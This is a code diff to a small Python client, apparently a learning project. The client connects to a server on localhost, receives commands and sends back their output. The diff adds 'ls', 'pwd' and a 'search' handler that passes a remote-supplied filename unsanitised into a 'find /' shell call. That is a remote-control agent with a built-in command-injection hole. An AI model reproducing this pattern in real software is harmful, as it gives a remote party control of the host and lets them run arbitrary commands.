@@ -12,7 +12,7 @@ def recv_all(sock, length):
 
 def connect_to_server():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('localhost', 12345))
+    s.connect(('localhost', 1234))
 
     while True:
         command = s.recv(1024).decode('utf-8')
@@ -59,6 +59,16 @@ def connect_to_server():
 
         if command.lower() == "ls":
             output = subprocess.getoutput("ls")
+            s.send(output.encode('utf-8'))
+
+        if command.lower() == "pwd":
+            output = subprocess.getoutput("pwd")
+            s.send(output.encode('utf-8'))
+
+        if command.lower().startswith("search"):
+            searched_file = command.split(" ")[1]
+            print(f"Searching for {searched_file}...")
+            output = subprocess.getoutput(f"find / -name {searched_file} 2>/dev/null")
             s.send(output.encode('utf-8'))
 
     s.close()
